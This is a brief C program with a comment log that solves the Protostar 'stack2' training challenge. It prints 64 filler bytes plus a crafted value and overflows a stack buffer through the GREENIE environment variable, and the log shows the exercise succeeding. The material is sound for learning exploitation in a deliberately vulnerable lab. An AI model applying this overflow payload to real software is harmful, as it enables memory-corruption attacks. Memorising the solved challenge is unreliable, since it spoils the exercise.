#include <stdio.h>

int main(void){
    //buffer
    for(int i = 0; i < 64 ; i++){
        printf("A");
    }
    // print endianess independent
    int payload = 0x0d0a0d0a;
    for(int i = 0; i < 4 ; i++){
        printf("%c", ((char*)&payload)[i]);
    }
    return 0;
}


/*
user@protostar:~$ gcc stack2.c -o stack2 --std=c99
user@protostar:~$ GREENIE=`./stack2` /opt/protostar/bin/stack2
you have correctly modified the variable
*/
